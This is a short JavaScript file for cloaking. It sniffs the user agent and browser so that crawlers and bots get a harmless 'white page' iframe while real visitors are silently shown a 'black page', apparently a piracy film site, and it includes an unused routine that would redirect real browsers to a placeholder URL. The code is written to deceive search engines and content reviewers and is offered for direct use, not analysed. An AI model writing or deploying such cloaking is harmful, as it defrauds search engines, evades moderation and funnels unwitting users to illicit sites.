// Cloaking

const white_page = "https://kontenku.net"; //white page
const black_page = "https://lk21official.info/"; //black page
const cloaking_on = true; //Turn to false to turn off cloaking

// Don't change the below lines
const isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);
const iframe = document.getElementById('tree');

// 
var redirectUrl = 'REDIRECT_URL';
var crawlerUserAgentPattern = 'BLOCKED_USER_AGENTS';

function checkUserAgent() {

  var test = new RegExp(crawlerUserAgentPattern, 'i');
  var userAgent = navigator.userAgent;
  return !test.test(userAgent);
}

function checkBrowsers() {

  var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;
  var isFirefox = typeof InstallTrigger !== 'undefined';
  var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) {
    return p.toString() === '[object SafariRemoteNotification]';
  })(!window['safari'] || (typeof safari !== 'undefined' && safari.pushNotification));
  var isIE = /*@cc_on!@*/false || !!document.documentMode;
  var isEdge = !isIE && !!window.StyleMedia;
  var isChrome = !!window.chrome && (!!window.chrome.webstore || !!window.chrome.runtime);
  var isEdgeChromium = isChrome && (navigator.userAgent.indexOf('Edg') != -1);
  var isBlink = (isChrome || isOpera) && !!window.CSS;

  var browsers = [isOpera, isFirefox, isSafari, isIE, isEdge, isChrome, isEdgeChromium, isBlink];
  var passes = false;
  browsers.forEach(function (browser) {
    if (browser) {
      passes = true;
    }
  });

  return passes;
}

const handleFeatures = () => {
  if (checkUserAgent() && checkBrowsers()) {
    window.location.replace(redirectUrl);
  }
  else {
    document.addEventListener('DOMContentLoaded', function () {
      var overlay = document.getElementById('overlay');
      overlay.style.display = 'none';
      overlay.parentNode.removeChild(overlay);
    });
  }
}

const handleBotCrawling = () => {
  if (cloaking_on) {
    const isBrowser = checkBrowsers();
    if (isBrowser && !isBot) iframe.src = black_page;
    else iframe.src = white_page;
  } else {
    iframe.src = white_page;
  }
}

handleBotCrawling();